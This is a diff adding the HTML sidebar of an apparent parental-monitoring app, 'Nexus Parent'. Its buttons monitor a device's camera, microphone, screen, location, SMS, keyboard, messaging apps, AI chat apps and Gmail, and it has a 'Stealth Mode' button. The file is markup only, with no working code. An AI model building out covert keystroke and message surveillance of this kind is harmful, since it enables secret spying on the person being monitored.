@@ -1,0 +1,62 @@
+<!-- Sidebar -->
+<!-- The sidebar contains the Nexus logo, toggle button for collapse/expand, and all monitoring feature buttons.
+Clicking the toggle button collapses the sidebar to show only the logo. When collapsed, clicking the logo expands it back.
+The sidebar has a resize handle for adjusting its width and includes a "Stealth Mode" button at the bottom. -->
+<div id="sidebar" class="sidebar">
+    <!-- Sidebar Header with Logo and Toggle -->
+    <!-- The logo button shows the Nexus Parent icon. When sidebar is collapsed, clicking it expands the sidebar.
+    The toggle button (hamburger menu) collapses/expands the sidebar. When collapsed, hovering over the logo shows the toggle icon. -->
+    <div class="sidebar-header-controls">
+        <button id="sidebar-logo-btn" class="sidebar-logo-btn" title="Nexus">
+            <img src="Nexus_Parent_icon.png" alt="Nexus" class="sidebar-logo-img" />
+        </button>
+        <button id="sidebar-toggle-btn" class="sidebar-toggle-btn" title="Toggle Sidebar">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3 12H21" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                <path d="M3 6H21" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                <path d="M3 18H21" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+        </button>
+    </div>
+    
+    <!-- Sidebar Content (buttons) -->
+    <!-- The sidebar content contains all monitoring feature buttons. This section is hidden when the sidebar is collapsed.
+    Each button has a data-feature attribute that corresponds to a particular monitoring or control function. -->
+    <div class="sidebar-content">
+        <button class="sidebar-btn" data-feature="camera">Monitor Camera</button>
+        <button class="sidebar-btn" data-feature="mic">Monitor Mic</button>
+        <button class="sidebar-btn" data-feature="screen">Monitor Screen</button>
+        <button class="sidebar-btn" data-feature="location">Monitor Location</button>
+        <button class="sidebar-btn" data-feature="sms">Monitor SMS</button>
+        <button class="sidebar-btn" data-feature="calllog">Monitor Call Log</button>
+        <button class="sidebar-btn" data-feature="notifications">Monitor Notifications</button>
+        <button class="sidebar-btn" data-feature="chats">Monitor Chats</button>
+        <button class="sidebar-btn" data-feature="keyboard">Monitor Keyboard</button>
+        <button class="sidebar-btn" data-feature="files">Monitor Files</button>
+        <button class="sidebar-btn" data-feature="whatsapp">Monitor WhatsApp</button>
+        <button class="sidebar-btn" data-feature="instagram">Monitor Instagram</button>
+        <button class="sidebar-btn" data-feature="telegram">Monitor Telegram</button>
+        <button class="sidebar-btn" data-feature="facebook">Monitor Facebook</button>
+        <button class="sidebar-btn" data-feature="snapchat">Monitor Snapchat</button>
+        <button class="sidebar-btn" data-feature="messenger">Monitor Messenger</button>
+        <button class="sidebar-btn" data-feature="chatgpt">Monitor ChatGPT</button>
+        <button class="sidebar-btn" data-feature="grok">Monitor Grok</button>
+        <button class="sidebar-btn" data-feature="claude">Monitor Claude</button>
+        <button class="sidebar-btn" data-feature="gmail">Monitor Gmail</button>
+        <button class="sidebar-btn" data-feature="wellbeing">Monitor Usage</button>
+        <button class="sidebar-btn" data-feature="wallpaper">Change Wallpaper</button>
+        <button class="sidebar-btn" data-feature="vibrateflash">Vibrate and Flash</button>
+        <button class="sidebar-btn" data-feature="applock">Monitor App Lock</button>
+    </div>
+    
+    <!-- Stealth Mode Button - Fixed at bottom -->
+    <!-- The Stealth Mode button is fixed at the bottom and doesn't scroll with other buttons.
+    It's styled with a red tint background to make it stand out. -->
+    <div class="sidebar-stealth-container">
+        <button id="stealth-mode-btn" class="sidebar-btn sidebar-stealth-btn">
+            Stealth Mode
+        </button>
+    </div>
+    
+    <div class="sidebar-resize-handle" id="sidebar-resize-handle"></div>
+</div>
